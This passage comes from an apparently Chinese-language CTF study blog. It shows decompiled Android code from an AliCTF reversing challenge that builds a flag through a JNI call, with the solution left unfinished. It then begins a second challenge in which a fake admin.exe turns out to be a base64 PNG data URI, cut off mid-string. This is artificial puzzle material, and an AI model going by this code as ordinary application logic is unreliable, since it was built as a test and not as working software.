        final TextView tv2 = (TextView) findViewById(R.id.textView3);
        //创建一个消息处理
        final Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            public void run() {
                MainActivity.this.t = System.currentTimeMillis();
                MainActivity.this.now = (int) (MainActivity.this.t / 1000);
                MainActivity.this.t = 1500 - (MainActivity.this.t % 1000);
                tv2.setText("AliCTF");
                if (MainActivity.this.beg - MainActivity.this.now <= 0) {
                    tv1.setText("The flag is:");
                    tv2.setText("alictf{" + MainActivity.this.stringFromJNI2(MainActivity.this.k) + "}");
                }
                MainActivity mainActivity;
                if (MainActivity.is2(MainActivity.this.beg - MainActivity.this.now)) {
                    mainActivity = MainActivity.this;
                    mainActivity.k += 100;
                } else {
                    mainActivity = MainActivity.this;
                    mainActivity.k--;
                }
                tv1.setText("Time Remaining(s):" + (MainActivity.this.beg - MainActivity.this.now));
                handler.postDelayed(this, MainActivity.this.t);
            }
        }, 0);
    }

    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    public boolean onOptionsItemSelected(MenuItem item) {
        if (item.getItemId() == R.id.action_settings) {
            return true;
        }
        return super.onOptionsItemSelected(item);
    }

    static {
        System.loadLibrary("lhm");
    }
}
```

解题待定..….我先去学下java



## 逆向入门

下载得到一个admin.exe，运行提示，您的电脑版本不支持

file一下该文件，得到：

![1569135788843](1569135788843.png)

发现它并不是一个exe文件，是一个ASCII text文件，使用cat得到该文件的类容：

```bash
data:image/png;base64,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